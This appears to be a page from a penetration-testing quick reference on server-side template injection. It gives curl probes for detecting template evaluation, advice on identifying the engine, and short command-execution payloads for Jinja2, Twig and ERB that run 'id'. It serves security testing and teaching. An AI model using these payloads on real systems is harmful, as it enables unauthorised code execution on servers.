# Server-side template injection (SSTI)

[← Foothold quick reference](../02-foothold.md)

Look at inputs that might become part of a template: page previews, email layouts, CMS content, and custom greetings. The question is whether the server treats your input as template code or passes it to a fixed template as data.

## First check

Send one expression at a time and compare it with a plain-text baseline. Replace the endpoint and parameter with the real input you found:

```bash
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-plain-end'
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-{{7*7}}-end'
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-{{7*8}}-end'
```

`probe-49-end` followed by `probe-56-end` is stronger evidence than seeing `49` once. If the braces are returned literally, this syntax was not evaluated at that point; the application may use another engine or render the input somewhere else, such as an email or PDF.

Try syntax that fits the suspected engine, rather than sending every form together:

```text
{{7*7}}       Jinja, Twig, and other curly-brace engines
${7*7}       FreeMarker and other dollar-expression engines
<%= 7*7 %>   ERB and other tag-based engines
```

These are leads, not engine names. For example, `{{7*'7'}}` can render `7777777` in Jinja and `49` in Twig; check the application's framework and a second engine-specific behavior before choosing a payload. Compare the raw HTTP response with the browser's DOM: browser-side evaluation is a different issue.

## After evaluation

Record the input location, raw request, response, and where the result appeared. Check error messages and application files for the engine and version. Then use that engine's syntax and available objects for a small manual proof.

```text
Jinja2: {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:   {{ ['id']|filter('system') }}
ERB:    <%= `id` %>
```

These are engine-specific examples, not interchangeable payloads. A sandbox or restricted template context may block them.

[OWASP SSTI testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/18-Server-side_Template_Injection) · [PortSwigger's engine comparison](https://portswigger.net/web-security/server-side-template-injection)
